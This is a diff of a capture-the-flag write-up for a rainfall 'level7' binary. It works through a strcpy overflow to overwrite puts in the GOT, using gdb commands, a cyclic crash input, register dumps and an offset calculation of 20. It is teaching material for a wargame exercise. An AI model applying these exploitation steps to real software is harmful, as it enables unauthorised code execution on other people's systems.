@@ -149,13 +149,14 @@ We can overwrite the puts call by "m" in the GOT using the strcpy overflow
 
 Get the address of puts in the GOT
 
-gdb-peda$ info function puts
+(gdb)$ info function puts
 All functions matching regular expression "puts":
 
 	Non-debugging symbols:
 	0x08048400  puts@plt
-	(gdb-peda)$ x/i 0x08048400
-	   0x8048400 <puts@plt>:	jmp    DWORD PTR ds:0x8049928
+
+(gdb)$ x/i 0x08048400
+	0x8048400 <puts@plt>:	jmp    DWORD PTR ds:0x8049928
 
 The address is "0x08049928"
 
@@ -173,21 +174,38 @@ The address is "0x08049928"
 
 The address is "0x080484f4"
 
-Get the offset of the first strcpy overflow, with the gdb-peda pattern tool for do it faster
+Get the offset of the first strcpy overflow, with my python scripts
 
-	(gdb-peda)$ pattern create 50 file
-
-	gdb-peda$ r $(cat file)
-	Starting program: /home/nico/42/rainfall/level7/Ressources/level7 $(cat file)
+	(gdb) r 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
+	Starting program: /home/user/level7/level7 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
 
 	Program received signal SIGSEGV, Segmentation fault.
-	...
+	0xb7eb8aa8 in ?? () from /lib/i386-linux-gnu/libc.so.6
 
-	(gdb-peda)$ pattern search
-	Registers contain pattern buffer:
-	EAX+0 found at offset: 20
-	EDX+0 found at offset: 20
-	...
+EIP was not overwritten, check all registers
+
+	(gdb) i r
+	eax            0x46464646	1179010630
+	ecx            0x0	0
+	edx            0x46464646	1179010630
+	ebx            0xb7fd0ff4	-1208152076
+	esp            0xbffff54c	0xbffff54c
+	ebp            0xbffff578	0xbffff578
+	esi            0x0	0
+	edi            0x0	0
+	eip            0xb7eb8aa8	0xb7eb8aa8
+	eflags         0x210282	[ SF IF RF ID ]
+	cs             0x73	115
+	ss             0x7b	123
+	ds             0x7b	123
+	es             0x7b	123
+	fs             0x0	0
+	gs             0x33	51
+
+EAX and EDX was overwritten, get the offset
+
+	./get_offset.py 46
+	F => offset = 20
 
 The offset is 20
 
